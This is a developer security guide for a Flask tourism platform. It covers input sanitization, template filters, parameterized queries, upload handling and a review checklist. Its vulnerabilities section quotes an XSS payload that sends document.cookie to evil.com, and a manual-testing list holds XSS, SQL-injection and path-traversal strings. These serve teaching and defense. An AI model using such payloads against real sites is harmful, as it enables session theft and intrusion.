# Developer Security Best Practices Guide

## Overview

This guide provides practical, actionable security guidelines for developers working on the GoMangatarem platform. Follow these practices to maintain and enhance the security posture of the application.

**Target Audience**: Developers, Contributors, Code Reviewers  
**Last Updated**: April 12, 2026  
**Version**: 1.0.0

---

## Table of Contents

1. [Golden Rules](#golden-rules)
2. [Working with User Input](#working-with-user-input)
3. [Working with Templates](#working-with-templates)
4. [Working with Database Queries](#working-with-database-queries)
5. [Working with File Uploads](#working-with-file-uploads)
6. [Working with URLs and Redirects](#working-with-urls-and-redirects)
7. [Error Handling](#error-handling)
8. [Code Review Checklist](#code-review-checklist)
9. [Common Vulnerabilities](#common-vulnerabilities)
10. [Quick Reference](#quick-reference)

---

## Golden Rules

### Rule #1: Never Trust User Input

**ALL** data from users, URL parameters, form fields, headers, cookies, or API requests should be treated as potentially malicious.

```python
# ❌ WRONG: Trusting user input
username = request.form.get('username')
search_query = request.args.get('q')

# ✅ CORRECT: Validate and sanitize
username = validate_and_escape(request.form.get('username', '').strip()[:30])
search_query = request.args.get('q', '').strip()[:200]
```

### Rule #2: Encode at the Last Moment

Encode data **immediately before** it's rendered in the browser, not when storing in the database.

```python
# ❌ WRONG: Encode when saving
user = User(
    username=escape(request.form.get('username')),  # Don't do this
    comment=request.form.get('comment')
)

# ✅ CORRECT: Encode when displaying
# In database: store raw (but sanitized) data
user = User(
    username=validate_and_escape(request.form.get('username', '').strip()),
    comment=sanitize_html_input(request.form.get('comment', ''))
)

# In template: encode when rendering
# {{ user.username|escape_strict }}
# {{ user.comment|sanitize }}
```

### Rule #3: Context Matters

The type of encoding depends on **where** the data is placed:

| Context | Encoding | Example |
|---------|----------|---------|
| HTML body | `escape_strict` or `sanitize` | `<div>{{ value\|escape_strict }}</div>` |
| HTML attribute | `escape_strict` | `<input value="{{ value\|escape_strict }}">` |
| JavaScript variable | `tojson` | `const data = {{ value\|tojson }};` |
| URL (href/src) | `safe_url` | `<a href="{{ url\|safe_url }}">` |
| CSS | Avoid dynamic CSS | Don't do this |

---

## Working with User Input

### Form Data

```python
from utils.security import (
    validate_username,
    validate_email_format,
    validate_password_strength,
    validate_and_escape,
    sanitize_html_input
)

@app.route('/submit', methods=['POST'])
def submit():
    # Step 1: Extract with defaults and length limits
    username = request.form.get('username', '').strip()[:30]
    email = request.form.get('email', '').strip().lower()[:120]
    comment = request.form.get('comment', '').strip()[:5000]
    
    # Step 2: Validate format
    if not validate_username(username):
        flash('Username must be 3-30 characters (letters, numbers, underscores only)', 'error')
        return redirect(url_for('form'))
    
    if not validate_email_format(email):
        flash('Please enter a valid email address', 'error')
        return redirect(url_for('form'))
    
    # Step 3: Sanitize before saving
    username = validate_and_escape(username)
    email = validate_and_escape(email)
    comment = sanitize_html_input(comment)  # Allows safe HTML tags
    
    # Step 4: Save to database
    user = User(username=username, email=email, comment=comment)
    db.session.add(user)
    db.session.commit()
```

### URL Parameters

```python
@app.route('/search')
def search():
    # Always provide defaults and length limits
    query = request.args.get('q', '').strip()[:200]
    page = request.args.get('page', 1, type=int)
    category = request.args.get('category', '')[:50]
    
    # Use parameterized queries (SQLAlchemy ORM does this automatically)
    results = Attraction.query.filter(
        Attraction.name.ilike(f'%{query}%'),
        Attraction.category == category
    ).all()
```

### JSON Data (API Endpoints)

```python
from flask import jsonify, request

@app.route('/api/items', methods=['POST'])
def create_item():
    data = request.get_json()
    
    if not data:
        return jsonify({'error': 'Invalid JSON'}), 400
    
    # Validate and sanitize
    name = validate_and_escape(data.get('name', '').strip()[:200])
    description = sanitize_html_input(data.get('description', '')[:5000])
    
    # Validate required fields
    if not name:
        return jsonify({'error': 'Name is required'}), 400
    
    # Save
    item = Item(name=name, description=description)
    db.session.add(item)
    db.session.commit()
    
    return jsonify({'id': item.id, 'name': item.name}), 201
```

---

## Working with Templates

### Safe Template Patterns

#### Displaying User-Generated Content

```html
<!-- ✅ CORRECT: Plain text fields (usernames, titles, names) -->
<h1>{{ attraction.name|escape_strict }}</h1>
<p>By {{ user.username|escape_strict }}</p>
<img src="{{ attraction.image_url|safe_url }}" alt="{{ attraction.name|escape_strict }}">

<!-- ✅ CORRECT: Rich text fields (reviews, descriptions) -->
<div class="prose">
    {{ review.comment|sanitize }}
</div>
<div>{{ attraction.description|sanitize }}</div>

<!-- ✅ CORRECT: JSON data in JavaScript -->
<script>
const flashMessages = {{ get_flashed_messages(with_categories=True)|tojson }};
const userData = {{ user_data|tojson }};
</script>

<!-- ✅ CORRECT: URLs in href/src -->
<a href="{{ user.website|safe_url }}">Website</a>
<a href="{{ url_for('public.attraction_detail', id=attraction.id)|safe_url }}">Details</a>
```

#### NEVER Use These Patterns

```html
<!-- ❌ WRONG: Using |safe on user content -->
<div>{{ user.comment|safe }}</div>

<!-- ❌ WRONG: Raw output without encoding -->
<div>{{ user.comment }}</div>

<!-- ❌ WRONG: User input in JavaScript without tojson -->
<script>
const comment = "{{ user.comment }}";  // Vulnerable to XSS
</script>

<!-- ❌ WRONG: User input in event handlers -->
<button onclick="handleClick('{{ user.input }}')">Click</button>

<!-- ❌ WRONG: User input in style attributes -->
<div style="{{ user.css }}">Content</div>
```

### Creating Custom Template Filters

If you need a new filter, add it to `utils/template_filters.py`:

```python
from markupsafe import Markup, escape

def my_custom_filter(value):
    """Description of what the filter does."""
    if value is None:
        return ""
    # Your logic here
    return str(escape(value))

def register_filters(app):
    """Register all custom filters."""
    app.jinja_env.filters['my_custom_filter'] = my_custom_filter
    # ... existing filters
```

---

## Working with Database Queries

### Use SQLAlchemy ORM (Always)

```python
# ✅ CORRECT: ORM queries are parameterized automatically
user = User.query.filter_by(username=username).first()
items = Item.query.filter(Item.name.ilike(f'%{search}%')).all()

# ✅ CORRECT: Using text() with parameters
from sqlalchemy import text
result = db.session.execute(
    text('SELECT * FROM items WHERE name LIKE :search'),
    {'search': f'%{search}%'}
)
```

### NEVER Use Raw SQL

```python
# ❌ WRONG: SQL injection vulnerability
query = f"SELECT * FROM users WHERE username = '{username}'"
db.session.execute(query)

# ❌ WRONG: Even with "escaping"
query = f"SELECT * FROM users WHERE username = '{username.replace(\"'\", \"''\")}'"
db.session.execute(query)
```

### MVT Tile Generator (Special Case)

The `utils/tile_generator.py` uses `text()` with named parameters, which is safe:

```python
# ✅ CORRECT: Parameterized query in tile generator
query = """
    SELECT ST_AsMVT(tile, 'layer', 4096, 'geom')
    FROM (
        SELECT geom, name FROM attractions
        WHERE ST_Intersects(geom, ST_MakeEnvelope(:min_x, :min_y, :max_x, :max_y, 4326))
    ) AS tile
"""
result = db.session.execute(text(query), {
    'min_x': bounds['min_x'],
    'min_y': bounds['min_y'],
    'max_x': bounds['max_x'],
    'max_y': bounds['max_y']
}).scalar()
```

---

## Working with File Uploads

### Secure File Upload Pattern

```python
from utils.file_helpers import save_uploaded_file, allowed_file, detect_media_type

@app.route('/upload', methods=['POST'])
def upload():
    if 'file' not in request.files:
        flash('No file provided', 'error')
        return redirect(request.url)
    
    file = request.files['file']
    
    if file.filename == '':
        flash('No file selected', 'error')
        return redirect(request.url)
    
    # save_uploaded_file handles:
    # - Double filename sanitization
    # - Extension validation
    # - Path traversal prevention
    file_url = save_uploaded_file(file)
    
    if not file_url:
        flash('Invalid file type or filename', 'error')
        return redirect(request.url)
    
    # Determine media type
    media_type = detect_media_type(file.filename)
    
    # Save to database
    gallery_item = GalleryItem(
        type=media_type,
        url=file_url,
        user_id=current_user.id
    )
    db.session.add(gallery_item)
    db.session.commit()
    
    flash('File uploaded successfully', 'success')
    return redirect(url_for('gallery'))
```

### File Naming

Files are automatically sanitized using double sanitization:

```python
# utils/file_helpers.py
filename = secure_filename(sanitize_filename(file.filename))
```

This prevents:
- Path traversal (`../../etc/passwd`)
- Special characters (`<script>.jpg`)
- Multiple extensions (`file.php.jpg`)

---

## Working with URLs and Redirects

### Safe Redirects

```python
from flask import redirect, url_for

# ✅ CORRECT: Use url_for() to generate URLs
return redirect(url_for('public.index'))

# ✅ CORRECT: Validate return URLs
next_url = request.args.get('next', '')
if next_url and next_url.startswith('/'):
    return redirect(next_url)
else:
    return redirect(url_for('public.index'))

# ❌ WRONG: Redirect to unvalidated user input
return redirect(request.form.get('redirect_url'))
```

### External URLs in Database

When storing external URLs (websites, social media):

```python
from utils.security import sanitize_url

@app.route('/profile', methods=['POST'])
def update_profile():
    website = request.form.get('website', '').strip()
    
    # Sanitize URL (blocks javascript:, data:, etc.)
    website = sanitize_url(website)
    
    current_user.website = website if website else None
    db.session.commit()
```

---

## Error Handling

### Safe Error Messages

Never expose sensitive information in error messages:

```python
# ❌ WRONG: Exposing internal details
try:
    db.session.commit()
except Exception as e:
    flash(f'Database error: {str(e)}', 'error')  # Exposes SQL details

# ✅ CORRECT: Generic user message, log details
try:
    db.session.commit()
except Exception as e:
    logger.error(f'Database commit failed: {str(e)}', exc_info=True)
    flash('An error occurred. Please try again.', 'error')
```

### HTTP Error Pages

Custom error pages are already configured in `app.py`:

```python
# app.py
error_codes = [400, 401, 403, 404, 408, 429, 451, 500]

def handle_error(e):
    code = getattr(e, 'code', 500)
    return render_template(f"errors/{code}.html"), code

for code in error_codes:
    app.errorhandler(code)(handle_error)
```

Error pages should:
- Not expose stack traces
- Not expose database details
- Provide helpful user guidance
- Log errors for debugging

---

## Code Review Checklist

When reviewing code, check for these security issues:

### Input Handling
- [ ] All user input validated and sanitized?
- [ ] Length limits applied to string inputs?
- [ ] Format validation for emails, usernames, phones?
- [ ] File uploads using `save_uploaded_file()`?

### Output Encoding
- [ ] No `|safe` filter on user content?
- [ ] Using `|escape_strict` for plain text?
- [ ] Using `|sanitize` for rich text?
- [ ] Using `|tojson` for JavaScript variables?
- [ ] Using `|safe_url` for URLs?

### Database
- [ ] Using SQLAlchemy ORM (no raw SQL)?
- [ ] If using `text()`, are parameters bound?
- [ ] No string concatenation in queries?

### URLs and Redirects
- [ ] Using `url_for()` instead of hardcoded URLs?
- [ ] Redirect URLs validated (start with `/`)?
- [ ] External URLs sanitized with `sanitize_url()`?

### Error Handling
- [ ] Error messages don't expose internals?
- [ ] Exceptions logged with details?
- [ ] User sees generic, helpful messages?

### Cookies and Sessions
- [ ] Not manually setting cookies without security flags?
- [ ] Using Flask-Login for session management?
- [ ] Not storing sensitive data in session?

---

## Common Vulnerabilities

### Cross-Site Scripting (XSS)

**What**: Attacker injects malicious JavaScript into pages viewed by other users.

**Prevention**:
1. Sanitize input with `sanitize_html_input()`
2. Encode output with `|escape_strict` or `|sanitize`
3. CSP headers block execution if injection occurs

**Example Attack**:
```
Input: <script>document.location='https://evil.com/?cookie='+document.cookie</script>
Result: Script tags removed, text preserved: "document.location='https://evil.com/?cookie='+document.cookie"
```

### SQL Injection

**What**: Attacker manipulates SQL queries to access/modify data.

**Prevention**: Use SQLAlchemy ORM (already parameterized).

**Example Attack**:
```
Input: ' OR '1'='1
ORM Result: WHERE username = ''' OR ''1''=''1' (treated as literal string)
```

### Cross-Site Request Forgery (CSRF)

**What**: Attacker tricks user into performing actions without their consent.

**Prevention**: Flask-WTF CSRF protection (already enabled).

**How it works**:
- All POST/PUT/DELETE requests require CSRF token
- Token validated server-side
- Missing/invalid token → 400 Bad Request

### Path Traversal

**What**: Attacker accesses files outside intended directory.

**Prevention**: Double filename sanitization.

**Example Attack**:
```
Input: ../../etc/passwd
Result: "etc_passwd" (path components removed)
```

### Session Hijacking

**What**: Attacker steals session cookie to impersonate user.

**Prevention**:
- HttpOnly flag prevents JavaScript access
- SameSite flag prevents cross-site cookie sending
- Secure flag ensures cookies only sent over HTTPS

---

## Quick Reference

### Import Statements

```python
# Input validation and sanitization
from utils.security import (
    validate_username,
    validate_email_format,
    validate_password_strength,
    validate_and_escape,
    sanitize_html_input,
    sanitize_filename,
    sanitize_url,
    validate_phone,
    validate_coordinates
)

# File uploads
from utils.file_helpers import (
    save_uploaded_file,
    allowed_file,
    detect_media_type
)
```

### Template Filters

| Filter | Use Case | Example |
|--------|----------|---------|
| `|escape_strict` | Usernames, titles, names | `{{ user.username\|escape_strict }}` |
| `|sanitize` | Reviews, descriptions | `{{ review.comment\|sanitize }}` |
| `|safe_url` | href, src attributes | `<a href="{{ url\|safe_url }}">` |
| `|tojson` | JavaScript variables | `const data = {{ value\|tojson }};` |

### Validation Functions

| Function | Input | Returns | Example |
|----------|-------|---------|---------|
| `validate_username()` | Username string | `bool` | `validate_username("user123")` → `True` |
| `validate_email_format()` | Email string | `bool` | `validate_email_format("user@example.com")` → `True` |
| `validate_password_strength()` | Password string | `(bool, str)` | `validate_password_strength("short")` → `(False, "Password must be at least 8 characters")` |
| `validate_and_escape()` | Any string | Escaped string | `validate_and_escape("<script>")` → `"&lt;script&gt;"` |
| `sanitize_html_input()` | HTML string | Sanitized HTML | `sanitize_html_input("<script>alert('XSS')</script>")` → `"alert('XSS')"` |
| `sanitize_url()` | URL string | Safe URL or `""` | `sanitize_url("javascript:alert(1)")` → `""` |

---

## Testing Your Code

### Run Security Tests

```bash
# All security tests
uv run pytest tests/test_security.py -v

# With coverage
uv run pytest tests/test_security.py --cov=utils.security
```

### Manual Testing

Test these payloads in forms:

```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
javascript:alert('XSS')
../../etc/passwd
' OR '1'='1
```

**Expected**: All should be rejected or sanitized.

---

## Getting Help

- **Security Issues**: Report to project maintainer immediately
- **Code Questions**: Check this guide or `docs/SECURITY_IMPLEMENTATION.md`
- **Code Review**: Request review before merging security-related changes
- **Vulnerability Discovery**: Follow incident response procedures

---

**Document Version**: 1.0.0  
**Last Updated**: April 12, 2026  
**Next Review**: October 12, 2026  
**Maintainer**: Development Team
